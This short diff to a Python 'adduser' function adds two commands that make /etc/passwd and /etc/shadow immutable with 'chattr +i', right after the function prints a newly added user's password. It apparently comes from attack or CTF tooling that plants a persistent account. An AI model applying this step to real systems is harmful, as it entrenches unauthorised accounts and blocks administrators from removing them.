@@ -30,6 +30,8 @@ def adduser(user, password):
     j2 = ml(command)
     if user in j and user in j2:
         print("----------------------->user：" + user + "password: " + password + "< -----------------------")
+        ml('chattr +i /etc/passwd')
+        ml('chattr +i /etc/shadow')
     else:
         print("----------------------->失败<-----------------------")
 
